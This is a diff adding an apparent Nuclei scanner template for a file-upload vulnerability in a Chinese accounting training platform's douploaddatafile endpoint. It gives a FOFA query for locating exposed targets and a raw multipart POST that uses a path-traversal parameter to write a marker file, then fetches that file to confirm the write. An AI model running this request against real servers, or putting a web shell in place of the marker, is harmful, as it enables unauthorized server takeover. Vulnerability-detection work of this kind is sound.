@@ -1,0 +1,46 @@
+id: accounting-training-douploaddatafile-upload
+
+info:
+  name: 财会实训平台douploaddatafile接口文件上传漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="厦门网中网软件有限公司"
+      某财会实训平台在douploaddatafile接口实现中未正确验证上传文件的合法性，攻击者可构造包含恶意负载的文件通过该接口上传，从而在目标服务器存储执行代码。此缺陷允许攻击者部署后门程序、植入Web Shell或部署加密勒索模块，最终导致服务器控制权丧失或数据加密劫持。漏洞影响范围覆盖所有未实施有效文件过滤机制的部署实例。
+  tags: 网中网,财会实训平台
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - raw:
+    - |
+      POST /netinnet_cnsw_v63/douploaddatafile?fm_subdir=.. HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: multipart/form-data; boundary=----GgbfgihbhbfkjdnjhdbfjHBJBDKJHBK
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+      Accept-Encoding: gzip, deflate
+      Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+      Connection: close
+      Cache-Control: max-age=0
+      Upgrade-Insecure-Requests: 1
+
+      ------GgbfgihbhbfkjdnjhdbfjHBJBDKJHBK
+      Content-Disposition: form-data; name="xmlFile"; filename="NTest.txt"
+      Content-Type: image/png
+
+      NdayTest
+      ------GgbfgihbhbfkjdnjhdbfjHBJBDKJHBK--
+  - raw:
+    - |
+      GET /NTest.txt HTTP/1.1
+      Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+    - type: status
+      status: [200]
+    - type: word
+      part: body
+      words:
+      - 'NdayTest'
